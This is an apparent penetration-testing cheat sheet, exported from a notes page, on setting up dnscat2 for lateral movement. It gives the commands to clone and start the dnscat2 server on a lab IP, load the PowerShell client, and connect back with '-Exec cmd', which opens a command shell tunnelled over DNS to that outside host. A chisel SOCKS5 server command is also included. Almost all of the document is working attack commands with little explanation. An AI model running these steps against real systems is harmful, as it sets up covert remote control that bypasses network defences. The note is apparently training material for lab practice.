# dnscat example

OS: Linux, Windows
Description:  dnscat2.rb server running on the specified IP address, port (53) & using the domain somesite.local with the no-cache option enabled.
Security Domains: Lateral Movement (https://www.notion.so/Lateral-Movement-1444c8e5237680dea1fed00199ad754d?pvs=21)
Target_Technology: Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)

### Clone and start the server

```jsx
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

```jsx
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=mydomain.local --no-cache
```

### Clone and import the PowerShell Module

```jsx
git clone https://github.com/lukebaggett/dnscat2-powershell.git
Import-Module dnscat2.ps1
```

### Start the client and connect to your server

```jsx
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain mydomain.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

### List options and use

| `dnscat2> ?` | Used to list dnscat2 options. |
| --- | --- |
| `dnscat2> window -i 1` | Used to interact with an established dnscat2 session. |
| `./chisel server -v -p 1234 --socks5` | Used to start a chisel server in verbose mode listening on port `1234` using SOCKS version 5. |